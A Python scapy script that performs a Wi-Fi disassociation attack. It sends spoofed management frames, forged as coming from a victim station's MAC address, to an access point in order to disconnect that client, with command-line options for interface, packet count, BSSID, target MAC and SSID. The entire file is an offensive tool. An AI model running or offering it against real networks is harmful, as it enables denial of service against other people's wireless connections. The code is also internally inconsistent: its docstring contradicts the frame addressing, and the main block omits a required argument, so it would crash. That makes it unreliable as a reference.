#!/usr/bin/env python3
from scapy.all import *
import time

from argparse import ArgumentParser as AP
from sys import exit
def action(iface: str, count: int, bssid: str, target_mac: str, ssid: str):
    """
    - addr1=target_mac specifies that this packet will go to the victim's computer
    - addr2=bssid specifies the MAC address of the AP 
    - addr3=bssid is the same as addr2
    """

    dot11 = Dot11(type=0, subtype=10, addr1=bssid, addr2=target_mac, addr3=bssid)
    frame = RadioTap()/dot11/Dot11Disas()/Dot11Elt(ID='SSID', info=ssid)
    sendp(frame, iface=iface, count=count, inter=0.100)

if __name__ == "__main__":
    parser = AP(description="Perform Deauthentication attack against a supplicant using spoofed disassociation frames sent to AP")
    parser.add_argument("-i", "--interface",help="interface to send deauth packets from")
    parser.add_argument("-c", "--count",help="The number of deauthentication packets to send to the victim computer")
    parser.add_argument("-a", "--bssid",metavar="MAC",help="the MAC address of the access point (Airodump-ng BSSID)")
    parser.add_argument("-t", "--target-mac",metavar="MAC",help="the MAC address of the victim's computer (Airodump-ng Station)")
    parser.add_argument("-s", "--ssid",help="the SSID of the Wi-Fi network (Airodump-ng ESSID)") 
    args = parser.parse_args()
    if (not args.interface or not args.count 
        or not args.bssid or not args.target_mac):
        print("[-] Please specify all program arguments... run `sudo python3 attack_disassociation_unidirectional.py -h` for help")
        exit(1)
    action(args.interface, int(args.count), args.bssid, args.target_mac)
    
